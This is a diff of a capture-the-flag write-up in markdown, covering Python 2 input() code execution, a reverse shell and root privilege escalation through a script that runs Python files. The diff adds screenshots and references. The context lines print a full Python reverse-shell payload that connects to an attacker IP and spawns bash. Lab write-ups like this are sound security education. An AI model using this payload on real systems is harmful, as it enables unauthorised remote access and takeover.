@@ -158,6 +158,8 @@ We can also escalate this eode execution to command injection through modules li
 
 I was able to trigger binary the command to echo `God Abeg!!!.
 
+----------------------
+
 ### Reverse shell
 
 - I used this payload to trigger a rev shell
@@ -168,6 +170,8 @@ I was able to trigger binary the command to echo `God Abeg!!!.
 
   ![image](https://github.com/user-attachments/assets/487a8e7e-fc99-4a71-8626-1af7ddbd51ef)
   
+---------------------
+
 ### PRIVESC WITH INTERNAL ROOT SERVICE
 
 - A `root.sh` in user `king` home directory reveals that root runs every py file in  a particular directory `/media/`
@@ -243,7 +247,27 @@ I was able to trigger binary the command to echo `God Abeg!!!.
   
   Payload:```import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<ip>,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")```
 
-- 
+- File uploaded
+  
+![image](https://github.com/user-attachments/assets/b526e538-edd1-45f1-be91-2ba691c0c759)
+
+- Root shell
+
+![image](https://github.com/user-attachments/assets/aab6fbc0-f644-41a8-bf51-55ed978959aa)
+
+--------------------
+
+### REFERENCES:
+
+- [Abusing input() in python2](https://sevenlayers.com/index.php/215-abusing-python-input)
+
+--------------------
+
+### THANKS FOR READING!!!!
+
+--------------------
+
+
   
 
 
